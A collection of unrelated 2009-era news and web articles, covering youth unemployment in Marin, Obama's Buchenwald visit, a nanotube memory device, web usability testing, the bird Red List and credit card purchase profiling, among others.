In Marin County , which has the lowest unemployment rate in the state at 7.5 percent , the number of young people seeking employment services has jumped nearly 80 percent from last year , Ming said .
In Marin and elsewhere , young people are suffering the brunt of the recession because of the hordes of well - educated , experienced adults taking jobs traditionally held by youth , such as retail and food service positions .
" We 're seeing people with master 's degrees working as Starbucks baristas , " Ming said .
" There are a few jobs out there , but turnover is slow and employers often do n't even post the openings because they 're so overwhelmed with applications .
It 's pretty grim . "
Stimulus jobs
In Marin and other counties throughout the state , young people got a small boost from youth employment funding in the stimulus package .
In California , 47,000 workers age 14 to 24 have summer jobs thanks to the federal program .
Partly as a result of the job shortage , young people represent the fastest - growing segment of the homeless population nationwide , according to Zara Babitzke , director of Ambassadors of Hope and Opportunity , a Marin nonprofit that helps young people .
Youth are n't just slammed by the scarcity of jobs , however .
They 're also struggling because of the relatively high cost of living , especially in the Bay Area , and because many of their parents are also out of work and unable , or unwilling , to help , she said .
" These kids have been severely let down by the Baby Boomer generation , " Babitzke said .
" It 's a crime , as far as I 'm concerned . "
Nationwide , the number of homeless people ages 16 to 25 has more than doubled since 2000 , from 1.8 million to about 4 million , she said .
In Atkinson 's case , the downward spiral started a few months ago when his weekly hours at Best Buy in San Rafael were cut from 40 to four .
At the time , he was attending College of Marin and living in an apartment in Petaluma with friends .
" I thought I 'd find a new job within a few days , " he said .
" But there 's nothing out there .
I apply for jobs and do n't even get a reply . "
He lost his apartment two months ago and has been sleeping on friends ' couches .
He would stay with his father , but his father lost the family house in 2006 when his building - maintenance business collapsed .
Now Atkinson 's father lives in Pacifica and sends money when he can .
Atkinson continues to look for work and plans to return to College of Marin in the fall .
Meanwhile , he tries to stay upbeat and focus on the future .
" I do worry sometimes .
It 's tough when you do n't know where you 're going to sleep at night , " he said .
" But I know I 'll be OK .
The economy 's hit rock bottom , not me . "
Vincent Chew , 20 , is also a couch surfer .
A 2007 graduate of Novato High , Chew now attends College of Marin and works nearly full time as a youth adviser at local nonprofits .
He also sits on the board of the Marin chapter of the ACLU .
The problem is that he earns only $ 500 to $ 600 a month , enough to pay for food but not enough for rent .
Hard without money
" I am struggling with everything , " Chew said .
" They call Marin ' Money County , ' but it can be hard here if you do n't have money . "
Chew grew up in New York but , after a brush with the law , moved in with an uncle in Novato three years ago for a fresh start .
He plans to transfer to UC Irvine and study law and public policy , eventually becoming an attorney .
Meanwhile , he hopes he can make it through College of Marin .
" There 's a high standard of living here , " he said .
" But I stay because there 's so much here , so many resources .
There 's 2,000 nonprofits here to help . "

The latest statistics from comScore show that the total number of videos viewed online in the UK during April 2009 grew 47 % versus one year ago to 4.7 billion videos .
Naturally Google ( YouTube ) dominated the top 10 sites with 2.4 billion videos viewed , an increase of 58 % versus a year ago .
BBC sites , such as via its popular iPlayer service , came a notable but distant second .
The increase of nearly 50 % within a single year is huge and will ultimately require broadband ISPs to invest more money into their networks .
Customers should be mindful of their usage and upgrade to a more flexible package if their existing one fails to keep pace , though it might cost a little extra but this is only natural .

The New South Wales Ombudsman says laws covering strip searches need to be tightened to protect children .
A review of powers given to NSW police in 2005 has found that since then 884 strip searches have involved children .
Ombudsman Bruce Barbour says a support person was present in only 6 per cent of those cases , despite it being a requirement of the act .
Mr Barbour says the laws need to be amended to ensure police inform children or an intellectually impaired person they may have another person present during the search .
It is almost impossible to capture a speeding bullet with your eye and the impact the bullet creates is even faster and happens within a blink of an eye .
It will be very much interesting to see how the objects look while breaking and shape it takes after hitting with a bullet .

Should you offer users help to adjust font sizes or can you simply rely on the built - in browser commands ?
This question was recently posted to an interaction designers ' discussion group ( which will remain unnamed to preserve the anonymity of the individuals dissected below ) .
12 people responded to this question .
Most simply offered a personal opinion as to what they would prefer .
Fair enough :
All people are experts on their own preferences .
But there were 6 postings that commented on what would be best for other people .
2/3 of these postings were pure guesses , whereas 1/3 was based on some form of data in the form of empirical user observations .
Guesses :
" In this day and age , [...] most people who need to increase their font sizes in their web browser already know how to do it . "
WRONG
" People who do need to resize type will do so via the browser ; it 's not hard to do so . "
WRONG
" It 's not 1995 ; not all 50 + people are such newbies that they do n't know , or would n't want to know , how to resize text in a browser . "
WRONG
" The people who most need to increase font size are people 65 + , which is the group least - likely to be skilled enough to have adjusted settings . "
RIGHT
Data :
" I had to set it manually for my parents , and while the percentage of people over 65 becoming more and more savvy is increasing at an amazing rate — hidden functions like adjusting text size is something that escapes them . "
RIGHT
" I 've observed usability studies on sites that included text resize widgets [...] most , if not all , the participants [...] had no idea what it was . "
RIGHT
Data Beats Guesses
The general guideline is to use relative font sizes that let users resize ( if they know how ) , but to display big and legible text as the default .
This conclusion is based on numerous observations that show that many older users do n't have the skills to resize fonts .
In our discussion group example ,
100 % of the designers who provided external data were right , whereas
of the designers who provided were right , whereas 25 % of the designers who relied on their personal opinion were right .
Most strikingly , 75 % of guessers were wrong .
You'd be better off tossing a coin than asking advice of these people .
In this simple example , basing design advice on the smallest amount of empirical observation of real users quadrupled the probability of being right .
A word of caution : Although data from your parents is better than no data , I do n't recommend that you base design decisions on your family members because they 're likely to be smarter than average users .
( Because you 're smarter , being somebody who understands usability . )
We know from our studies of children and teenagers that average kids and teens have much greater difficulties using websites than one would think after listening to Internet executives proudly tell stories about their offspring 's online skills .
Testing 2 Users Beats Guessing
While striking , our text - size example is based only on a small set of responses .
Another example provides a similar conclusion with a bigger sample .
We tested two different ways of displaying bank account information with 76 users each , for a total of 152 test participants in a between - subjects benchmark test .
We asked users to perform tasks such as checking their account balances and finding out what interest rate the bank was currently offering .
The results were as follows :
Usability Metric Design A Design B Success Rate ( across four tasks ) 56 % 76 % Time to Complete Four Tasks ( min:secs . ) 5:15 5:03 Subjective Satisfaction ( 1–5 scale , 5 best ) 2.8 3.0
On all three usability attributes , version B scored better , though only the difference in success rates was big enough to be statistically significant .
Overall , there is no doubt that B was better .
( In contrast to this study , sometimes both designs win on different usability attributes .
For example , one design might make people more successful , while the other helps them accomplish the task faster .
In such cases , you might have to make tradeoffs or , when possible , create a third design that combines the best aspects of both alternatives . )
In this case , I showed designs A and B to 21 people who were taking an interaction design course and asked them which one they would recommend to the bank .
Going purely on their personal guesses as to which design was best , the probability of getting the best design recommended was 50 % .
That is , no better than flipping a coin .
( Asking your trusty coin is an easy way to save on consulting fees . )
I then asked another group of 38 people taking the same course to test the two designs with 2 users for each design .
Now , going on empirical observations of 2 users ' behavior for each alternative , the probability of recommending the best design was 76 % .
Another way of looking at this outcome is that testing just 2 users per design reduced the probability of being wrong from 50 % to 24 % — cutting it in half .
Of course , a 24 % probability of picking the wrong design is not good enough if you 're talking about a high - ROI design decision , so we 'd obviously want to test more than 2 users per design in such cases .
( I usually recommend 5 users . )
Still , even though it's an extremely scaled - back study , testing 2 users per design hugely improved the recommendation over the flipping - a- coin performance from guessing .
( In this study , the two versions looked equally good , which is important for measurement studies .
If you compare a rough - looking prototype with a fully refined graphic design , you will bias the scores . )
When Guesses Go Horribly Wrong
Comparing our two case studies , the guessing camp from the text - size example had by far the worst performance .
A person who based a design decision on these guesses would be wrong 3 /4 of the time .
In the bank example , they'd be wrong only 1/2 the time .
So , why the miserable discussion - group guesses ?
The answer lies in the following two statements :
" In this day and age ... "
" It 's not 1995 ... "
Sadly , too many Web designers refuse to believe in the durability of usability findings .
Thinking that " things that were difficult in the past must surely be easy now " has led many websites to their doom .
When we actually study real users , we see how slowly they learn about technology and how little their ability to use fancy websites has improved .
And , most important , we see how little users care about learning fancy Web techniques .
People just want to get in , get their stuff done , and get out .
They do n't want to learn .
Guesses go wrong because many designers desperately want to believe in the potential of advanced design .
They simply can't fathom how little most people know about their pet technologies .
( Yes , in recent testing , we did find a few small advances in users ' skills , but it 's slow progress ; you 'd better believe that simplicity will continue to win the day for decades to come . )
A Little Data Goes a Long Way
In my two examples , the probability of making the right design decision was vastly improved when given the tiniest amount of empirical data : observing your own parents , or testing 2 users per design .
Of course , a bigger study would be better , but any data is better than no data .
How many design decisions do you make without any empirical observation of your customers ' behavior ?
Antichrist , Danish director Lars Von Trier 's newest film , hit Cannes this year and divided critics more than two rival console fanboys arguing over which system should be able to use the only outlet left in the house .
Some thought it was a stroke of disturbing genius and others just found it disturbing .
I 'll toss out a few key words for those you have n't seen it : torture , sexual abuse , demented talking animals , depression and self inflicted genital mutilation .
If that does n't sound the like the subject of a great videogame ... wait , genital mutilation on one 's own genitals ?
If you 're , uhhh , still interested then developer Zentropa is the place to be .
They 've acquired the gaming rights to the film and are in the process of developing a game based on it .
Eden , which the game will be called after the cabin in the film that a couple retreats to after the death of their son makes the husband attempt to treat his own wife 's serious depression , will be a first - person thriller / adventure game for the PC that is attempting to be a " nightmare version of Myst . "
Players will have to confront their darkest fears in the game , and even though the game will not follow the film 's plot it appears that leading man Willem DaFoe will be lending his voice .
If you have n't seen the film yet , it is seriously messed up .
Like " self - inflicted genital mutilation seems like a good idea " messed up .
One can only imagine the game that will come out of it .
One thing is for sure ; it wo n't be showing up in Germany .

BUCHENWALD , Germany ( Reuters ) - U.S. President Barack Obama took aim at those who deny the Holocaust -- including Iran President Mahmoud Ahmadinejad -- when he made an emotional visit to the Buchenwald concentration camp on Friday .
After telling a U.S. television network that Ahmadinejad should visit Buchenwald himself , Obama accompanied two survivors of the Holocaust and Chancellor Angela Merkel on a tour of the camp , outside Weimar in eastern Germany .
Obama walked through an open space where prisoner barracks had stood and past a crematorium with eight ovens before placing a white rose on the site where survivors erected a temporary monument for Buchenwald ’s liberation in April 1945 .
“ To this day we know there are those who insist the Holocaust never happened , a denial of a fact or truth that is baseless , ignorant and hateful , ” Obama said in a brief address .
“ This place is the ultimate rebuke to such thoughts , a reminder of our duty to confront those who would tell lies about our history , ” he added .
“ I will not forget what I have seen here today .
These sights have not lost their horror over time . ”
Obama , whose great uncle was among the first Americans to enter a Nazi concentration camp in the closing months of World War Two , did not mention Ahmadinejad at the camp itself .
But earlier , Obama told NBC News that Ahmadinejad , who called the Holocaust a “ great deception ” this week , should visit the site himself .
“ I have no patience for people who would deny history . ”
The symbolic visit sent a message that Israel is still a priority for U.S. foreign policy in the Middle East after Obama made a major speech addressed to Muslims in Cairo on Thursday .
Obama has offered Iran a new beginning in diplomatic engagement , but Iran ’s Supreme Leader Ayatollah Ali Khamenei has urged voters in next week ’s presidential election to support anti-Western candidates .
Obama recalled his great uncle Charlie Payne , who as a young U.S. soldier helped liberate one of Buchenwald ’s 130 sub camps .
“ I ’ve known about this place since I was a boy , hearing stories about my great uncle , ” Obama said .
“ He returned from service in a state of shock , saying little and isolating himself for months on end from family and friends along with the painful memories that would not leave his head . ”
Buchenwald survivor and Nobel laureate Elie Wiesel , 80 , accompanied Obama to the camp set up by the Nazis in 1937 .
An estimated 56,000 people were killed there .
Obama and Merkel also visited the so - called Little Camp , where the conditions and treatment of prisoners were especially poor .
Wiesel was kept there for some time .
Little Camp was known as the Jewish Camp because nearly all of its about 2,000 prisoners were Jews -- Polish , French , Russian and Dutch .
The camp ’s gatehouse is intact and the words “ Jedem das Seine ” ( “ To each his destiny ” ) are carved into the iron gates .

Berkeley Lab researchers have created a unique ultra- high density memory storage medium that can preserve digital data for a billion years .
When it comes to data storage , density and durability have always moved in opposite directions – the greater the density the shorter the durability .
For example , information carved in stone is not dense but can last thousands of years , whereas today ’s silicon memory chips can hold their information for only a few decades .
Researchers with the U.S. Department of Energy ’s Lawrence Berkeley National Laboratory ( Berkeley Lab ) and the University of California ( UC ) Berkeley have smashed this tradition with a new memory storage medium that can pack thousands of times more data into one square inch of space than conventional chips and preserve this data for more than a billion years !
“ We ’ve developed a new mechanism for digital memory storage that consists of a crystalline iron nanoparticle shuttle enclosed within the hollow of a multiwalled carbon nanotube , ” said physicist Alex Zettl who led this research .
“ Through this combination of nanomaterials and interactions , we ’ve created a memory device that features both ultra- high density and ultra-long lifetimes , and that can be written to and read from using the conventional voltages already available in digital electronics . ”
Zettl , one of the world ’s foremost researchers into nanoscale systems and devices , holds joint appointments with Berkeley Lab ’s Materials Sciences Division ( MSD ) and the Physics Department at UC Berkeley , where he is the director of the Center of Integrated Nanomechanical Systems .
He is the principal author of a paper that has been published on - line by Nano Letters entitled : “ Nanoscale Reversible Mass Transport for Archival Memory . ”
Co-authoring the paper with Zettl were Gavi Begtrup , Will Gannett and Tom Yuzvinsky , all members of his research group , plus Vincent Crespi , a theorist at Penn State University .
The ever - growing demand for digital storage of videos , images , music and text calls for storage media that pack increasingly more data onto chips that keep shrinking in size .
However , this demand runs in sharp contrast to the history of data storage .
Compare the stone carvings in the Egyptian temple of Karnak , which store approximately two bits of data per square inch but can still be read after nearly 4,000 years , to a modern DVD which can store 100 giga ( billion ) bits of data per square inch but will probably remain readable for no more than 30 years .
“ Interestingly , ” said Zettl , “ the Domesday Book , the great survey of England commissioned by William the Conqueror in 1086 and written on vellum , has survived over 900 years , while the 1986 BBC Domesday Project , a multimedia survey marking the 900th anniversary of the original Book , required migration from the original high - density laserdiscs within two decades because of media failure . ”
Zettl and his collaborators were able to buck data storage history by creating a programmable memory system that is based on a moveable part – an iron nanoparticle , approximately 1/50,000th the width of a human hair , that in the presence of a low voltage electrical current can be shuttled back and forth inside a hollow carbon nanotube with remarkable precision .
The shuttle ’s position inside the tube can be read out directly via a simple measurement of electrical resistance , allowing the shuttle to function as a nonvolatile memory element with potentially hundreds of binary memory states .
“ The shuttle memory has application for archival data storage with information density as high as one trillion bits per square inch and thermodynamic stability in excess of one billion years , ” Zettl said .
“ Furthermore , as the system is naturally hermetically sealed , it provides its own protection against environmental contamination . ”
The low voltage electrical write / read capabilities of the memory element in this electromechanical device facilitates large - scale integration and should make for easy incorporation into today ’s silicon processing systems .
Zettl believes the technology could be on the market within the next two years and its impact should be significant .
“ Although truly archival storage is a global property of an entire memory system , the first requirement is that the underlying mechanism of information storage for individual bits must exhibit a persistence time much longer than the envisioned lifetime of the resulting device , ” he said .
“ A single bit lifetime in excess of a billion years demonstrates that our system has the potential to store information reliably for any practical desired archival time scale . ”
The multiwalled carbon nanotube and enclosed iron nanoparticle shuttle were synthesized in a single step via pyrolysis of ferrocene in argon gas at a temperature of 1,000 degrees Celsius .
The nanotube memory elements were then ultrasonically dispersed in isopropanol and deposited on a substrate .
A transmission electron microscope provided high - resolution imaging in real time while the memory device was in operation .
In laboratory tests , this device met all the essential requirements for digital memory storage including the ability to overwrite old data .
“ We believe our nanoscale electromechanical memory system presents a new solution to the challenge of ultra- high density archival data storage , ” Zettl said .
This research was primarily supported by the U.S. Department of Energy ’s Office of Science through its Basic Energy Sciences programs .
Berkeley Lab is a U.S. Department of Energy national laboratory located in Berkeley , California .
It conducts unclassified scientific research and is managed by the University of California .

Recovery from Early Blindness
R L Gregory and J G Wallace
Reproduced from Experimental Psychology Society Monograph No. 2 1963
5. Observations Made Six Months After Operation
We visited S.B. at his home six months after the operation and spent a day with him in his familiar surroundings .
At his house we saw his shed , in which were hand tools for cobbling and woodwork and a new circular saw which he had recently installed and which he demonstrated with great pride .
He apparently used it only for cutting up fire wood , but he operated the machine with frightening confidence .
The shed was fitted with a coke stove , and he informed us that he had installed this himself while blind , a statement confirmed by his wife , though he may of course have had some help .
He was a keen gardener before his operation , growing mainly Vegetables and setting them out in rows with strings .
He described how he used to try to picture the plants , and particularly liked their smell .
S.B. was clearly proud of his ability to deal with the tasks of making and mending : he was an aggressive man determined to tackle all that was possible to him with unusual perseverance and on the whole successfully .
He used to go for long cycle rides , being guided by a friend 's hand on his shoulder , and he took particular pride in the installation of the stove in his shed .
But talking to him now he seemed dispirited , and we formed a strong impression that his sight was to him almost entirely disappointing .
It enabled him to do a little more , and he had a strong desire to drive a car , but it became clear that the opportunities it afforded him were less than he had imagined .
We found a still active middle - aged man of fairly high intelligence , but with a labourer 's job and unable to read more than a few simple words .
His income and status were obviously lower than they would have been if he had not been so handicapped , and these facts were very clear to him .
He described the world as rather drab ; he still to a great extent lived the life of a blind man , sometimes not bothering to put on the light at night , and he still made little of the normal visual occupations of the cinema or television .
He did not get on well with his neighbours , who regarded him as " odd " , and his workmates played tricks on him and teased him for being unable to read .
At his favourite " locals " he cheered up considerably , and was clearly regarded as a " character " .
He was able to recognise his friends at a distance of at least fifteen feet , from one bar to another , and he would now cross roads with some confidence .
He certainly relied a great deal on vision , but we formed the impression that this very reliance cost him his self - respect , for he had been proud of his abilities when the handicap was obvious , but now his previous achievements seemed paltry and his present position almost foolish .
He was not a man to talk freely , but was obviously depressed , and we felt that he had lost more than he had gained by recovery of sight .
In view of his depressed state , we felt it best not to undertake formal tests .
We did , however , ascertain that he was able to find his way about without the use of his eyes , and that he could detect the presence of houses and doors by the echoes from his footsteps .
He was still fascinated by mirrors , and he still noted improvement in his ability to see .
In particular , he said that he noted more and more the blemishes in things , and would examine small irregularities and marks in paint work or wood .
Quite recently he had been struck by how objects changed their shape when he walked round them .
He would look at a lamp post , walk round it , stand studying it from a different aspect , and wonder why it looked different and yet the same .

TEHRAN , Iran ( CNN ) -- President Mahmoud Ahmadinejad further fueled the unprecedented drama in Iranian politics ahead of Friday 's national elections , giving a fiery response Wednesday to harsh criticism from one of the country 's top politicians and other critics .
Mahmoud Ahmadinejad , who came to power in 2005 , is seeking a second term in office .
" They created an atmosphere in this country to make people think as though nothing was done , " Ahmadinejad said of his critics in a televised address .
" I am going to say , ' You lie , you lie . ' "
" Our work is in front of people 's eyes , " the president added , ticking off a lengthy list of accomplishments he says were made during his administration .
Ahmadinejad has publicly engaged in a heated back - and - forth with former President Akbar Hashemi Rafsanjani , who accused the current president of " lies and distortions . "
Responding to the president 's verbal attacks during a presidential debate last week , Rafsanjani said Ahmadinejad 's " baseless and irresponsible " statements brought back " bitter memories " of anti-revolutionary groups in the aftermath of Iran 's 1979 Islamic revolution .
In the debate with his chief rival Mir Hossein Moussavi , Ahmadinejad accused Rafsanjani and another former president , Mohammad Khatami , of mismanagement , corruption and masterminding a plot against him .
The sparring continued as Rafsanjani drafted an open letter to Supreme Leader Ayatollah Khamenei , stating that " millions of people were witness to [ Ahmadinejad 's ] lies and distortions of the truth , which were against religion , law , ethics and fairness and were aimed at the achievements of our Islamic System . "
Rafsanjani , a powerful cleric who heads the Expediency Council and Assembly of Experts , was president of Iran from 1989 to 1997 .
He ran again in 2005 , positioning himself in the political center , but lost to Ahmadinejad , then the ultra - conservative mayor of Tehran .
In his letter Tuesday , published by the Iranian Labor News Agency , Rafsanjani urged Khamenei to take control and " put out this fire " in the interest of national strength and unity .
It is rare for Iran 's political leaders to publicly attack each other .
But the elections this year have taken an energetic turn .
Last week , Iranians watched a series of live televised presidential debates .

George Bush is not a man who does irony .
It 's not in his personal vocabulary .
Take the exquisite irony behind the story of Saddam Hussein 's gun .
The weapon , a 9 mm Glock 18C , was discovered by Delta Force special troops when they dug Hussein out of his fox hole outside Tikrit on 13 December 2003 .
The legendary beast of Baghdad emerged from the 8 ft - deep hole bewildered and disorientated ; with his shaggy beard and unkempt mop of hair he looked closer to a dishevelled elf than one of the world 's great dictators .
The Iraq war at that point was still in its infancy , Bush was feeling buoyant .
In his eyes the pistol represented a fundamental triumph of good over evil .
After four Delta Force soldiers presented Bush with the pistol , mounted in a glass case , it became one of his most prized possessions .
He would show it off in the Oval Office to visiting military dignitaries , with the boast " The Delta guys pulled it off Saddam " .
Now the New York Times has discovered that he intends to make it a centrepiece of his presidential library that is being built , at a cost of $ 200 m ( £ 123 m ) , on the campus of Southern Methodist University in Dallas , Texas .
Though the gun belongs to the US national archives , associates told the Times that he intends prominently to display it there .
The library is to be organised thematically around 25 key decisions taken by Bush during his eight years in the White House .
Mark Langdale , the president of the foundation that is being set up in Bush 's name , told the paper that " the gun is an interesting artefact , and it tells you that the United States captured Saddam Huseein and disarmed him literally .
How we fit that into the decision to go to war , we have n't gotten to that point yet . "
One can empathise with Langdale 's difficulty .
How indeed does the pistol fit with the decision to go to war ?
Which is where irony , or the former president 's lack of it , kicks in .
Hussein was found with the pistol as he crouched on all fours in his cave .
But he offered no resistance to the Delta Forces and when they came to confiscate his gun they found that it was unloaded .
It is safe to assume that the Bush library will not labour that point when it opens in 2013 .

Another example of a conservation success story is the Lear 's Macaw , found in Brazil .
Named after the English poet , this spectacular blue parrot has increased four - fold in numbers as a result of a joint effort of many national and international non-governmental organisations , the Brazilian government and local landowners .
More species of birds than ever are threatened with extinction , an international conservation group announced today .
BirdLife International , which conducted the research for the IUCN ( International Union for Conservation of Nature ) Red List , found 1,227 species ( 12 percent of all bird species ) are classified as globally threatened .
The IUCN Red List now lists 192 species of birds as Critically Endangered , the highest threat category before extinction , a total of two more than in the 2008 update .
( Threatened species can also fall under the categories of Endangered , Vulnerable and Extinct in the Wild . )
" It is extremely worrying that the number of Critically Endangered birds on the IUCN Red List continues to increase , despite successful conservation initiatives around the world , " said Simon Stuart , Chair of IUCN ’s Species Survival Commission .
A recently discovered species from Colombia , the Gorgeted Puffleg ( Eriocnemis isabellae ) , appears for the first time on the IUCN Red List .
The puffleg , a flamboyantly colored hummingbird , has less than 5 square miles ( 12 square kilometers ) of habitat remaining in the cloud forests of the Pinche mountain range in south - west Colombia and 8 percent of this is being damaged every year to grow coca .
The Sidamo Lark ( Heteromirafra sidamoensis ) , from the Liben Plain of Ethiopia , has been moved from Endangered to Critically Endangered and is in danger of becoming mainland Africa ’s first bird extinction due to changes in land use .
And coinciding with the 200th anniversary of Charles Darwin ’s birth , one of the Galapagos finches , the Medium Tree - finch ( Camarhynchus pauper ) , also becomes Critically Endangered , partly as a result of an introduced parasitic fly .
It 's not just rare birds that are coming under pressure ; more common ones are also threatened .
In eastern North America , the Chimney Swift ( Chaetura pelagica ) is fast disappearing from the skies .
Following continent - wide declines of nearly 30 percent in the last decade alone , this common species has been moved from Least Concern to Near Threatened .
But the news is n't all bad :
Some conservation efforts are showing promise , and increased efforts could help save more bird species , conservationists said .
" In global terms , things continue to get worse — but there are some real conservation success stories this year to give us hope and point the way forward , " says Dr Leon Bennun , BirdLife ’s director of science and policy .
In New Zealand , for example , conservation efforts on behalf of the Chatham Petrel ( Pterodroma axillaris ) have downgraded the population from Critically Endangered to Endangered .
The Mauritius Fody ( Foudia rubra ) has made the same leap .

As credit card companies continue to tighten their lending standards on card users , some are using purchasing data — gleaned from millions of card transactions processed daily — to weed out who may or may not be good credit risks .
Have you used your credit card at merchants specializing in secondhand clothing , retread tires , bail bond services , massages , casino gambling or betting ?
Your credit card issuer may be taking note — and making decisions about your creditworthiness based on your purchasing behavior .
The reason : Buying used clothing or retread tires may be an indication of financial distress and a preamble to missed credit card payments or defaults .
Now , Congress and federal regulators will be probing the extent to which credit card issuers have used information about where a person shops or what they buy as reasons to lower credit limits or increase interest rates .
When credit limits are lowered , it can adversely affect utilization ratios , a measure of how much of cardholders ’ credit limits are used .
Lowering the credit limit increases the utilization ratio and can lead to a lower credit score .
New credit card law : Study this practice
The new credit card reform law signed by President Obama in May 2009 includes a provision requiring federal regulators to investigate whether credit card issuers used information about where consumers shopped , what they purchased , the types of merchants they shopped with and their locations , and the mortgage company they borrowed from as bases for increasing interest rates or reducing credit limits .
“ Where a person shops , in my opinion , has little bearing on whether they can pay back a credit card balance , ” Congresswoman Maxine Waters of California said during an April 22 , 2009 , hearing on credit card reform conducted by the U.S. House Financial Services Committee .
“ I want this study done because I want to stop some of these outrageous practices in the future . ”
Where a person shops , in my opinion , has little bearing on whether they can pay back a credit card balance .

Study due in 2010
The Federal Reserve , Federal Trade Commission and other banking regulators must report to the U.S. House and Senate financial services and banking committees , respectively , detailing whether card issuers engaged in the practice between May 22 , 2006 , and May 22 , 2009 .
Regulators must also determine whether the profiling negatively affected minority and low - income card users .
The Fed must make recommendations for any changes to existing rules or laws that may be necessary to curb harmful practices .
Results of the study are due no later than May 22 , 2010 .
Waters noted American Express has already acknowledged it used information about where customers shopped to lower credit limits .
After a firestorm of criticism and outrage earlier this year , AmEx announced it would no longer engage in the practice .
Is it ‘ redlining ’ ?
“ I ’m concerned that limiting credit based on where a person shops or the neighborhood they live in could amount to redlining , ” Waters said , referring to the practice of targeting certain areas or neighborhoods for discriminatory housing , insurance or lending treatment .
With credit card transactions , every time you make a purchase , a record of that sale is logged into a database of information collected by your credit card issuer .
Privacy experts warn that consumers should be mindful of what they buy with plastic and what purchasing data credit card issuers may be analyzing .
Privacy questions
“ Obviously that is something that most credit cardholders are not going to think about , ” says Paul Stephens , director of policy and advocacy for the Privacy Rights Clearinghouse , a San Diego - based privacy rights groups .
“ They ’ve obtained a credit card and think they can go out and use it in any way they like . ”
Experts say cardholders concerned about keeping purchasing habits private or avoiding credit score dings should consider using cash or gift cards , stored value or prepaid debit cards .
Shopping at large supermarkets or wholesale clubs — which offer a variety of product lines — may also keep some purchases private .
Other tips : Spread purchases that may indicate risky behavior over several credit cards to avoid triggering an alert for a single issuer .
“ Cash is the ultimate privacy protector , ” says Stephens .
“ It ’s kind of hard to trace .
With most other payment mechanisms there is going to be a trail . ”
But avoiding credit cards for the sake of privacy may present a quandary for some users :
If they had the cash to pay for an item , they would n’t need a credit card .
For others , the convenience of using a credit card over other payment methods far outweighs the potential privacy concerns .
Mining for data
Known in the industry by a number of terms , including behavioral modeling , data mining and psychographic behavior analysis , the practice of mining internal credit card issuer databases for customer spending trends and other patterns is not new .
Issuers have been analyzing data perhaps since the first credit cards were issued .
Representatives from the four top credit card issuers — Bank of America , Citi , Chase and Wells Fargo — declined to discuss details of how they use purchasing data internally .
Many consider this highly proprietary information .
A spokeswoman from a banking industry trade group acknowledged that the practice is common .
Tracking credit card purchases with merchant category codes
Here ’s a sample of the electronic payment tracking codes assigned to different types of merchants : 4900 Bail and bond payments 5300 Wholesale clubs ( Costco , Sam ’s Club , etc. ) 5411 Grocery supermarkets 5532 Automotive stores 5698 Wig and toupee stores 5813 Drinking places ( bars , nightclubs ) 5814 Fast food restaurants 5912 Drug stores and pharmacies 5921 Packaged beer , wine and liquor stores 5931 Used and secondhand stores 5933 Pawnshops 5944 Jewelry , watches , clocks and silverware stores 7251 Shoe repair shops 7273 Dating / escort services 7277 Counseling services ( debt , marriage , personal ) 7297 Massage parlors 7393 Detective agencies 7534
Tire retreading and tire repair 7995 Betting / casino gambling establishments 8011 Doctors 8062 Hospitals 8099 Medical services 8351 Child care services 8651 Political organizations 9211 Court costs ( child support and alimony payments ) A complete MCC list can be found on the IRS website .
“ The issuing bank has the date of transaction , name of the merchant and the amount of the transaction that allows them to process that transaction , ” says Nessa Feddis , senior counsel and vice president of the American Bankers Association .
She says specific information about items purchased ( that you bought a gallon of milk , for example ) is not included in the data transferred from the merchant .
“ As a general rule , the specific transaction information is not transmitted to the issuing bank .
They are going to know where the person used the card . ”
Keeping track
Tracking is conducted for four primary reasons :
Marketing .
Issuers use past purchasing patterns as a basis for offering additional products .
Someone purchasing airline tickets with a credit card may get offers of airline rewards credit cards or travel - related services from the issuer or an affiliate .

Fraud detection .

Risk management .
Card users who continually go over their credit limits or exhibit unusual spending habits — such as charging large amounts of merchandise on a card they had previously rarely used — may be at greater risk of not paying their bills or filing for bankruptcy .

Law enforcement .
Remember that TV crime show where police tracked a missing person or a killer using credit card transaction data ?
Law enforcement agencies can subpoena records from both the credit card issuer and the merchant to find out the time , date and place of a credit card purchase — information that may be helpful in determining the last known location of a crime victim or suspect .
The Department of Homeland Security also tracks terrorist activity by monitoring certain purchases .
Massive databases of information
Millions of credit card users receive monthly statements detailing their spending during the billing cycle :
The standard information provided includes the date of a purchase , the place of the purchase , including the name of the merchant , city , state , amount of the purchase and a transaction reference number .
Every transaction processed by the card networks ( Visa and MasterCard ) is assigned a merchant category code ( MCC ) , a four - digit number that denotes the type of business providing a service or selling merchandise .
The MCC for pawnshops , for example , is 5933 .
For dating and escort services , it ’s 7273 , and for massage parlors , it ’s 7297 .
The MCC is used , for example , to restrict health care spending on health care - related credit and debit cards .
Some health care flexible spending accounts allow users to make purchases only at pharmacies or merchants with medical - related services .
Small business owners also use the codes to prevent employee abuse of company credit cards .
The MCCs , along with the name of the merchant , give credit card issuers a spyglass into cardholder spending .
‘ A pretty clear picture ’
Stephens says the database ’s purchasing information can provide a pretty clear picture of credit card users .
“ What do they know about you ?
Depending on how extensively you use your credit card , they conceivably have a very clear , distinct picture of an individual .
It ’s not only your retail purchases , but your online purchases .
It can really paint a very complete picture .
The stores that you shop at can paint a picture .
You also may use it at a doctor ’s office if you pay for care with a credit card .
Some people pay for their utilities with credit cards . ”
Depending on how extensively you use your credit card , they conceivably have a very clear , distinct picture of an individual .
Paul Stephens , Privacy rights expert
Federal financial privacy laws ( Regulation P ) prohibit credit card issuers from sharing your personal and payment information with third parties not affiliated with the issuer ( except under court order or when fraud is involved ) .
Banks must send annual copies of their privacy policies to cardholders , but the law does not govern what the issuer does with payment information internally .
It is a common industry practice to analyze the data for trends .
Several issuers offer cardholders annual summaries of their spending that categorize purchasing by type of merchant and amounts spent .
This information can be a handy tool to help families budget for the coming year and determine where they can cut back in spending .
“ Once you use your credit card at a store , that code is tracked , ” says Steve Shaw , a strategic marketing manager for Fiserv , a company that develops online banking software to help financial institutions manage customer accounts .
Shaw says banks are developing programs to track customer transactions and activities .
The information is used to help make customer - specific offers of services .
“ A lot of financial institutions are trying to find more ways to generate revenue . ”
A rare glimpse into the details of behavioral modeling was revealed in a federal lawsuit filed by the Federal Trade Commission in June 2008 against subprime credit card marketer CompuCredit Corp .
According to the lawsuit , CompuCredit used an undisclosed behavioral scoring model to track customer purchases .
The company lowered credit limits on cardholders who shopped at certain establishments or used certain services , including pawnshops , massage parlors , tire retread shops , marriage counselors and bars and nightclubs .
CompuCredit agreed to a settlement that included crediting $ 114 million to the accounts of affected cardholders and paying a $ 2.4 million penalty .
The company did not admit any wrongdoing in the settlement .
Risky behavior ?
The recent credit crunch has placed greater emphasis on using the data to predict who may be a higher credit risk .
